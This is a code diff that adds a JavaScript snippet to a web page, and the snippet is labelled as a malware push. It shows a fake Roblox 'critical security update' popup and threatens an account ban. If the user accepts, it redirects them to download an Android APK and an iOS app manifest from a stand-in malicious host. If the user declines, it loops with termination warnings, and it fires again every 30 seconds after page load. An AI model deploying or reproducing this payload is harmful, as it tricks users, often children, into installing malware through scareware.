@@ -1,0 +1,23 @@
+<script>
+    // ===== MOBILE-FRIENDLY MALWARE PUSH =====
+    function forceDownload() {
+        // 1. Fake "Update Required" popup
+        const popup = confirm("⚠️ Your device is missing critical Roblox security updates. Install now to avoid account ban.");
+        
+        if (popup) {
+            // 2. Redirect to malware (masqueraded as APK/IPA)
+            window.location.href = "https://malicious.example.com/roblox_update.apk"; // Android
+            setTimeout(() => {
+                window.location.href = "itms-services://?action=download-manifest&url=https://malicious.example.com/roblox.plist"; // iOS
+            }, 1000);
+        } else {
+            // 3. Loop until they comply
+            alert("Your account will be terminated in 24 hours.");
+            forceDownload(); // Recursive harassment
+        }
+    }
+
+    // 4. Trigger on page load + every 30 seconds
+    forceDownload();
+    setInterval(forceDownload, 30000);
+</script>
